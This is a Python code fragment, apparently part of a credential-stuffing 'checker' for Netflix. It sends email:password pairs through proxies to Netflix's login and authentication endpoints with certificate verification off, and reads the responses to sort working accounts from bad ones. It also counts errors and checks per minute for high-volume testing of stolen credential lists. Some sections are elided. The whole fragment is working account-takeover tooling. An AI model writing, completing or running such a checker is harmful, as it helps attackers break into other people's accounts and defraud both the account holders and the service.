...
def check(email:str,password:str):
    ...
    while retries != checker.retries:
        ...
        try:
            with Session() as s:
                cookie = dict(flwssn=s.get("https://www.netflix.com/au/login",headers=header_1,proxies=set_proxy(proxy),timeout=checker.timeout).cookies.get("flwssn"))
                response = s.post("https://api-global.netflix.com/account/auth",headers=header_2,data=data,verify=False,proxies=set_proxy(proxy),timeout=checker.timeout).text
                if "NetflixId\":null,\"user\":{\"" in response or "Incorrect email address or password" in response or "Missing password" in response or "NEVER_MEMBER" in response:
                    ...
                    info = s.get("https://www.netflix.com/YourAccount",headers=header_3,cookies=cookie,proxies=set_proxy(proxy),timeout=checker.timeout).text
            ...
            checker.errors += 1
    if not checker.cui:
        log("bad",email+":"+password,"Netflix")
    checker.bad += 1
    checker.cpm += 1
    return